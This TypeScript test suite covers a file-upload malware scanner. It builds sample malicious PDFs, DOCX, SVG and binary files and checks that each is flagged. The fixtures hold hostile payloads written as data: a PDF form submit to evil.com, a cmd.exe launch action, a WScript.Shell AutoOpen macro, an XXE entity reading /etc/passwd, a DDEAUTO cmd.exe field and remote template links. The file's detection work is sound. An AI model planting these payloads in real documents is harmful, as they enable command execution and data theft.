import { PDF } from "@libpdf/core";
import { Result } from "better-result";
import { describe, expect, test } from "bun:test";
import { Document, Packer, Paragraph, TextRun } from "docx";
import JSZip from "jszip";

import { scanFile } from "./scan";

// -- Helpers --

const encoder = new TextEncoder();

/** Creates a valid PDF. If `payload` is given, it's injected as raw
 *  bytes so YARA rules can match on it. */
const makePdf = async (payload?: string): Promise<Uint8Array> => {
  const pdf = PDF.create();
  pdf.addPage();
  const clean = await pdf.save();
  if (!payload) {
    return clean;
  }

  // Append the payload so it exists in the raw byte stream
  const extra = encoder.encode(payload);
  const buf = new Uint8Array(clean.length + extra.length);
  buf.set(clean);
  buf.set(extra, clean.length);
  return buf;
};

/** Creates a valid DOCX via the `docx` library. */
const makeCleanDocx = async (): Promise<Uint8Array> => {
  const doc = new Document({
    sections: [
      {
        children: [
          new Paragraph({
            children: [new TextRun("test")],
          }),
        ],
      },
    ],
  });
  return new Uint8Array(await Packer.toBuffer(doc));
};

type ThreatDocxOpts = {
  vbaContent?: string;
  contentTypesXml?: string;
  relsXml?: string;
  extraFiles?: Record<string, string>;
};

/** Creates a DOCX ZIP with injected threat content for YARA tests. */
const makeThreatDocx = async (opts: ThreatDocxOpts): Promise<Uint8Array> => {
  const zip = new JSZip();
  zip.file(
    "[Content_Types].xml",
    opts.contentTypesXml ?? '<?xml version="1.0"?><Types></Types>',
  );
  zip.file("word/document.xml", "<document/>");
  if (opts.vbaContent !== undefined) {
    zip.file("word/vbaProject.bin", opts.vbaContent);
  }
  if (opts.relsXml !== undefined) {
    zip.file("word/_rels/document.xml.rels", opts.relsXml);
  }
  if (opts.extraFiles) {
    for (const [name, content] of Object.entries(opts.extraFiles)) {
      zip.file(name, content);
    }
  }
  return zip.generateAsync({ type: "uint8array" });
};

/** OLE2 binary with compound file magic. */
const makeOle2 = (): Uint8Array => {
  const buf = new Uint8Array(256);
  buf.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
  return buf;
};

const makeSvg = (extra = ""): Uint8Array =>
  encoder.encode(`<svg xmlns="http://www.w3.org/2000/svg">${extra}</svg>`);

const DOCX_MIME =
  "application/vnd.openxmlformats-officedocument" +
  ".wordprocessingml.document";

// -- PDF threat tests (YARA) --

describe("pdf threats", () => {
  test("PDF with /JavaScript → reject", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/JavaScript (alert)"),
        declaredMimeType: "application/pdf",
        fileName: "evil.pdf",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(
      r.findings.some(
        (f) => f.severity === "reject" && f.message.includes("/JavaScript"),
      ),
    ).toBe(true);
  });

  test("PDF with /JS action → reject", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/JS (alert('xss'))"),
        declaredMimeType: "application/pdf",
        fileName: "evil.pdf",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(
      r.findings.some(
        (f) => f.severity === "reject" && f.message.includes("/JS"),
      ),
    ).toBe(true);
  });

  test("PDF with font subset name /JSUIQA+Arial → pass", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/BaseFont/JSUIQA+Arial/DescendantFonts 81 0 R"),
        declaredMimeType: "application/pdf",
        fileName: "font.pdf",
      }),
    );
    const jsFindings = r.findings.filter((f) => f.rule === "pdf_javascript_js");
    expect(jsFindings).toHaveLength(0);
  });

  test("PDF with /Launch → reject", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/Launch /F (cmd.exe)"),
        declaredMimeType: "application/pdf",
        fileName: "evil.pdf",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(
      r.findings.some(
        (f) => f.severity === "reject" && f.message.includes("/Launch"),
      ),
    ).toBe(true);
  });

  test("PDF with /SubmitForm → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/SubmitForm /F (http://evil.com)"),
        declaredMimeType: "application/pdf",
        fileName: "exfil.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule === "pdf_submit_form")).toBe(true);
  });

  test("PDF with /GoToR → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/GoToR /F (remote.pdf)"),
        declaredMimeType: "application/pdf",
        fileName: "remote.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule === "pdf_goto_remote")).toBe(true);
  });

  test("PDF with /GoToE → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/GoToE /D (embedded.pdf)"),
        declaredMimeType: "application/pdf",
        fileName: "embedded.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule === "pdf_goto_embedded")).toBe(true);
  });

  test("PDF with /RichMedia → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/RichMedia /Subtype /Flash"),
        declaredMimeType: "application/pdf",
        fileName: "flash.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule === "pdf_rich_media")).toBe(true);
  });

  test("PDF with /EmbeddedFile → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/EmbeddedFile (att.pdf)"),
        declaredMimeType: "application/pdf",
        fileName: "attached.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.message.includes("embedded file"))).toBe(
      true,
    );
  });

  test("PDF with /OpenAction + /URI → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/OpenAction /URI (http://x)"),
        declaredMimeType: "application/pdf",
        fileName: "redirect.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.message.includes("OpenAction"))).toBe(true);
  });

  test("clean PDF → pass", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf(),
        declaredMimeType: "application/pdf",
        fileName: "clean.pdf",
      }),
    );
    expect(r.verdict).toBe("pass");
    expect(r.findings).toHaveLength(0);
  });
});

// -- Embedded executable tests (YARA) --

describe("embedded executables", () => {
  test("PE at offset > 64 → warn", async () => {
    const buffer = new Uint8Array(512);
    const mzOffset = 100;
    buffer[mzOffset] = 0x4d; // M
    buffer[mzOffset + 1] = 0x5a; // Z
    buffer[mzOffset + 0x3c] = 0x80;
    const peOff = mzOffset + 0x80;
    buffer[peOff] = 0x50; // P
    buffer[peOff + 1] = 0x45; // E
    buffer[peOff + 2] = 0x00;
    buffer[peOff + 3] = 0x00;

    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: "application/pdf",
        fileName: "doc.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("pe"))).toBe(true);
  });

  test("bare MZ without PE header → no false positive", async () => {
    const buffer = new Uint8Array(256);
    buffer[100] = 0x4d;
    buffer[101] = 0x5a;

    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: "application/pdf",
        fileName: "doc.pdf",
      }),
    );
    const peFindings = r.findings.filter((f) =>
      f.rule.includes("pe_executable"),
    );
    expect(peFindings).toHaveLength(0);
  });

  test("ELF at offset > 64 → warn", async () => {
    const buffer = new Uint8Array(256);
    buffer[100] = 0x7f;
    buffer[101] = 0x45; // E
    buffer[102] = 0x4c; // L
    buffer[103] = 0x46; // F

    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: "application/pdf",
        fileName: "doc.pdf",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.message.includes("ELF"))).toBe(true);
  });
});

// -- Office macros tests (pompelmi heuristics) --

describe("office macros", () => {
  test("DOCX with vbaProject.bin → warn", async () => {
    const buffer = await makeThreatDocx({
      vbaContent: "VBA_CONTENT",
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "macros.docx",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("ooxml_macros"))).toBe(true);
  });

  test("OLE2 container → warn", async () => {
    const buffer = makeOle2();
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: "application/msword",
        fileName: "legacy.doc",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("ole"))).toBe(true);
  });

  test("DOCX with suspicious macro keywords → reject", async () => {
    const vba =
      "Sub AutoOpen()\n" +
      '  Set obj = CreateObject("WScript.Shell")\n' +
      "End Sub";
    const buffer = await makeThreatDocx({
      vbaContent: vba,
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "malicious-macro.docx",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(
      r.findings.some((f) => f.rule.includes("office_macro_suspicious")),
    ).toBe(true);
  });

  test("clean DOCX → pass", async () => {
    const buffer = await makeCleanDocx();
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "clean.docx",
      }),
    );
    expect(r.verdict).toBe("pass");
  });
});

// -- SVG active content tests (YARA) --

describe("svg active content", () => {
  test("SVG with <script> → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg("<script>alert(1)</script>"),
        declaredMimeType: "image/svg+xml",
        fileName: "icon.svg",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("svg_script"))).toBe(true);
  });

  test("SVG with onload= → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg('<rect onload="alert(1)"/>'),
        declaredMimeType: "image/svg+xml",
        fileName: "icon.svg",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("svg_event"))).toBe(true);
  });

  test("SVG with foreignObject → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg("<foreignObject><body>html</body></foreignObject>"),
        declaredMimeType: "image/svg+xml",
        fileName: "icon.svg",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("svg_foreign"))).toBe(true);
  });

  test("SVG with javascript: URI → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg('<a href="javascript:alert(1)">click</a>'),
        declaredMimeType: "image/svg+xml",
        fileName: "icon.svg",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("svg_javascript"))).toBe(
      true,
    );
  });

  test("SVG with external xlink:href → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg('<use xlink:href="https://evil.com/sprite.svg#icon"/>'),
        declaredMimeType: "image/svg+xml",
        fileName: "icon.svg",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("svg_external"))).toBe(true);
  });

  test("SVG with data: href → warn", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg('<image href="data:text/html;base64,PHNjcmlwdD4="/>'),
        declaredMimeType: "image/svg+xml",
        fileName: "icon.svg",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("svg_external"))).toBe(true);
  });

  test("clean SVG → pass", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg("<rect width='1' height='1'/>"),
        declaredMimeType: "image/svg+xml",
        fileName: "icon.svg",
      }),
    );
    expect(r.verdict).toBe("pass");
  });
});

// -- OOXML threat tests (YARA) --

describe("ooxml threats", () => {
  test("DOCX with XXE entity declaration → reject", async () => {
    const buffer = await makeThreatDocx({
      contentTypesXml:
        '<?xml version="1.0"?>' +
        "<!DOCTYPE foo " +
        '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
        "<Types>&xxe;</Types>",
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "xxe.docx",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(r.findings.some((f) => f.rule.includes("ooxml_xxe"))).toBe(true);
  });

  test("DOCX with external relationship → warn", async () => {
    const buffer = await makeThreatDocx({
      relsXml:
        '<?xml version="1.0"?>' +
        "<Relationships>" +
        '<Relationship Type="schema" ' +
        'Target="https://evil.com/payload" ' +
        'TargetMode="External"/>' +
        "</Relationships>",
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "external.docx",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("ooxml_external"))).toBe(
      true,
    );
  });

  test("DOCX with ActiveX control → reject", async () => {
    const buffer = await makeThreatDocx({
      extraFiles: {
        "word/activeX/activeX1.xml": '<ax:ocx r:id="rId1"/>',
      },
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "activex.docx",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(r.findings.some((f) => f.rule.includes("ooxml_activex"))).toBe(true);
  });

  test("DOCX with DDE field code → reject", async () => {
    const buffer = await makeThreatDocx({
      extraFiles: {
        "word/document.xml":
          "<w:document><w:body><w:p><w:r>" +
          '<w:fldChar w:fldCharType="begin"/>' +
          "</w:r><w:r>" +
          '<w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc"</w:instrText>' +
          "</w:r></w:p></w:body></w:document>",
      },
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "dde.docx",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(r.findings.some((f) => f.rule.includes("ooxml_dde"))).toBe(true);
  });

  test("DOCX with OLE object → warn", async () => {
    const buffer = await makeThreatDocx({
      extraFiles: {
        "word/embeddings/oleObject1.bin": "OLE_DATA",
      },
      contentTypesXml:
        '<?xml version="1.0"?>' +
        '<Types><Override PartName="/word/embeddings/oleObject1.bin" ' +
        'ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>' +
        "</Types>",
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "ole.docx",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("ooxml_ole"))).toBe(true);
  });

  test("DOCX with remote template reference → reject", async () => {
    const buffer = await makeThreatDocx({
      relsXml:
        '<?xml version="1.0"?>' +
        "<Relationships>" +
        '<Relationship Type="attachedTemplate" ' +
        'Target="https://evil.com/template.dotm"/>' +
        "</Relationships>",
    });
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "remote-template.docx",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(
      r.findings.some((f) => f.rule.includes("ooxml_remote_template")),
    ).toBe(true);
  });
});

// -- PDF polyglot tests --

describe("pdf polyglot", () => {
  test("PDF content not at offset 0 still detected", async () => {
    const prefix = new Uint8Array(128);
    // JPEG SOI marker
    prefix[0] = 0xff;
    prefix[1] = 0xd8;
    prefix[2] = 0xff;
    prefix[3] = 0xe0;

    const pdfContent = await makePdf("/JavaScript (alert)");
    const buffer = new Uint8Array(prefix.length + pdfContent.length);
    buffer.set(prefix);
    buffer.set(pdfContent, prefix.length);

    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: "image/jpeg",
        fileName: "polyglot.jpg",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(r.findings.some((f) => f.message.includes("/JavaScript"))).toBe(
      true,
    );
  });
});

// -- MIME spoofing tests --

describe("mime spoofing", () => {
  test("PDF with /JavaScript declared as image/png → still reject", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf("/JavaScript (alert)"),
        declaredMimeType: "image/png",
        fileName: "image.png",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(r.findings.some((f) => f.message.includes("/JavaScript"))).toBe(
      true,
    );
  });

  test("SVG with <script> declared as text/plain → still flagged", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeSvg("<script>alert(1)</script>"),
        declaredMimeType: "text/plain",
        fileName: "notes.txt",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("svg_script"))).toBe(true);
  });

  test("ELF binary declared as image/jpeg → still flagged", async () => {
    const buffer = new Uint8Array(256);
    buffer[100] = 0x7f;
    buffer[101] = 0x45; // E
    buffer[102] = 0x4c; // L
    buffer[103] = 0x46; // F

    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: "image/jpeg",
        fileName: "photo.jpg",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.message.includes("ELF"))).toBe(true);
  });

  test("OLE2 binary declared as text/csv → still flagged", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: makeOle2(),
        declaredMimeType: "text/csv",
        fileName: "data.csv",
      }),
    );
    expect(r.verdict).not.toBe("pass");
    expect(r.findings.some((f) => f.rule.includes("ole"))).toBe(true);
  });
});

// -- Integration tests --

describe("scanFile integration", () => {
  test("clean PDF → pass, 0 findings", async () => {
    const r = Result.unwrap(
      await scanFile({
        buffer: await makePdf(),
        declaredMimeType: "application/pdf",
        fileName: "clean.pdf",
      }),
    );
    expect(r.verdict).toBe("pass");
    expect(r.findings).toHaveLength(0);
  });

  test("corrupt ZIP declared as DOCX → reject", async () => {
    const buffer = encoder.encode("not a zip file at all");
    const r = Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: DOCX_MIME,
        fileName: "corrupt.docx",
      }),
    );
    expect(r.verdict).toBe("reject");
    expect(r.findings.some((f) => f.rule === "corrupt-zip")).toBe(true);
  });

  test("performance: 1 MB buffer < 500 ms", async () => {
    const buffer = new Uint8Array(1024 * 1024);
    const start = performance.now();
    Result.unwrap(
      await scanFile({
        buffer,
        declaredMimeType: "application/pdf",
        fileName: "large.pdf",
      }),
    );
    expect(performance.now() - start).toBeLessThan(500);
  });
});
